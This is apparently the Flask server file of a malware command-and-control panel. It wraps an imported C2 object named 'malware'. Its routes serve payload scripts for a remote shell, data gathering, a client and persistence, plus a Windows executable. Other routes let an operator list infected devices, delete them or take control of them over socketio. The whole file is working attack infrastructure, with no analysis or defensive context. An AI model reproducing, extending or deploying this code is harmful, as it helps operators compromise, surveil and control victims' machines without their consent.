from flask import Flask, render_template, request, redirect, send_from_directory
import eventlet
import socketio
from c2 import C2

app = Flask(__name__)
sio = socketio.Server(cors_allowed_origins='*', logger=False)
malware = C2(sio)

@app.route("/")
def index():
    return render_template("index.html")

@app.route('/terminal/<path:path>')
def terminal(path):
    devices = malware.list_devices()
    if path in devices:
        return render_template("terminal.html")
    else:
        return redirect('/')

@app.route('/term/<path:path>')
def term(path):
    return render_template("jterm.html")

@app.route("/shell.py")
def shell():
    return render_template("client/shell.py")


@app.route("/get_data.py")
def get_data():
    return render_template("client/get_data.py")

@app.route('/client.py')
def client_data():
    return render_template("client/client.py")

@app.route('/persistence.py')
def persistence():
    return render_template("client/persistence.py")

@app.route('/win')
def win11():
    return send_from_directory('templates/executables', 'windows.exe')



@app.route('/devices', methods=['POST'])
def post():
    return malware.list_all_devices()

@app.route('/delete', methods=['POST'])
def delete():
    data = request.get_json()
    malware.delete_device(data['device_id'])
    return ""

@app.route('/ctrl', methods=['POST'])
def ctrl():
    data = request.get_json()
    malware.ctrl(data['device_id'])
    return ""

if __name__ == "__main__":
    flaskApp = socketio.Middleware(sio, app)
    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), flaskApp)